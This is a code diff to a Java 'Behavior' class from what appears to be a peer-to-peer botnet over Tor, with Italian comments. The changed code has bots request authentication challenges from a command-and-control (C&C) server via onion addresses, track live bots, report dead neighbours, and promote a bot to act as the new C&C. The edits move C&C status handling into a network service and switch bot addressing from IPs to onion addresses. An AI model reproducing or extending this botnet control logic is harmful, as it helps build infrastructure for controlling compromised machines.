@@ -34,8 +34,8 @@ public class Behavior {
 	@Autowired
 	private NetworkService nServ;
 
-	@Autowired
-	private Config eng;
+	//@Autowired
+	//private Config eng;
 
 	@Autowired
 	private BotRequest req;
@@ -118,7 +118,7 @@ public class Behavior {
 		while (flag) {
 			System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerOnions().get(0).getValue1());
 			//Primo valore è Long KEYNUMBER il secondo è Integer ITERATIONNUMBER
-			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(), nServ.getCommandConquerOnions().get(0).getValue1());
+			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(), nServ.getCommandConquerOnions().get(0).getValue1(),nServ.getMyOnion());
 			if (challenge != null) {
 				if (challenge.getValue2() != -1) {
 					String key = auth.generateStringKey(challenge.getValue2());
@@ -463,15 +463,16 @@ public class Behavior {
 		SyncIpList<OnionAddress, String> gg = nServ.getAliveBot();
 
 		for (Bot bot : bots) {
-			if (vertex.indexOf(new OnionAddress(bot.getIp())) >= 0)
-				gg.add(new Pairs<OnionAddress, String>(new OnionAddress(bot.getIp()), bot.getIdBot()));
+			if (vertex.indexOf(new OnionAddress(bot.getOnionAddress())) >= 0)
+				gg.add(new Pairs<OnionAddress, String>(new OnionAddress(bot.getOnionAddress()), bot.getIdBot()));
 		}
 
 		// avvisa cec che se ready
 		Boolean b = req.ready(ip, myId);
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
-			eng.setCommandandconquerStatus(true);
+			//TODO eng.setCommandandconquerStatus(true); replace con sotto
+			nServ.setCommandConquerStatus(true);
 			nServ.setCounterCeCMemory(0);
 			pServ.setNewKing("");
 		}
@@ -528,7 +529,7 @@ public class Behavior {
 
 		List<Pairs<OnionAddress, PublicKey>> newNeighbours = new ArrayList<Pairs<OnionAddress, PublicKey>>();
 		List<Pairs<String, String>> response = null;
-		if (!eng.isCommandandconquerStatus()) {
+		if (!nServ.isCommandandconquerStatus()) {
 			response = req.sendDeadNeighToCeC(nServ.getCommandConquerOnions().get(0).getValue1().toString(), nServ.getIdHash(), listDeadNegh);
 			if (response != null) {
 				newNeighbours = nServ.tramsuteNeigha(response);
